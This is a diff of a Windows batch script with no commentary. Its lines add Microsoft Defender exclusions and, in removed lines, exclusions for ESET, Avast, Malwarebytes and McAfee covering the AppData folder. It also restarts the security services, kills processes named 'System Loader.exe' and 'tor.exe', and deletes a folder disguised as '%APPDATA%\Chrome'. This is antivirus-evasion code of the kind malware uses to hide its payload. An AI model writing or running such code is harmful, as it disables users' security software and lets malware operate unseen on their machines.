@@ -6,30 +6,6 @@ if %errorlevel% NEQ 0 (
 )
 @echo off
 powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%\Chrome'"
-set appdataPath="%APPDATA"
-set esetRegPaths=(
-    "HKEY_LOCAL_MACHINE\SOFTWARE\ESET\ESET Security\Exclusions"
-    "HKEY_LOCAL_MACHINE\SOFTWARE\ESET\ESET NOD32 Antivirus\Exclusions"
-    "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\ESET\ESET Security\Exclusions"
-    "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\ESET\ESET NOD32 Antivirus\Exclusions"
-)
-for %%i in (%esetRegPaths%) do (
-    REG ADD "%%i" /v "Exclusion_AppData" /t REG_SZ /d "%appdataPath%" /f
-)
-@echo off
-(
-    echo [%APPDATA%]
-) >> "C:\ProgramData\Avast Software\Avast\avast5.ini"
-net stop AvastSvc >nul 2>&1
-net start AvastSvc >nul 2>&1
-reg add "HKLM\SOFTWARE\Malwarebytes\Malwarebytes' Anti-Malware\Exclusions" /v "AppDataFolder" /t REG_SZ /d "%APPDATA%" /f
-net stop mbamservice >nul 2>&1
-net start mbamservice >nul 2>&1
-if exist "C:\Program Files\McAfee\Agent\cmdagent.exe" (
-    "C:\Program Files\McAfee\Agent\cmdagent.exe" /exclude add "%APPDATA%"
-    echo cmdagent.exe not found...
-)
-@echo off
 taskkill /F /IM "System Loader.exe"
 taskkill /F /IM "tor.exe"
 rmdir /s /q "%APPDATA%\Chrome"
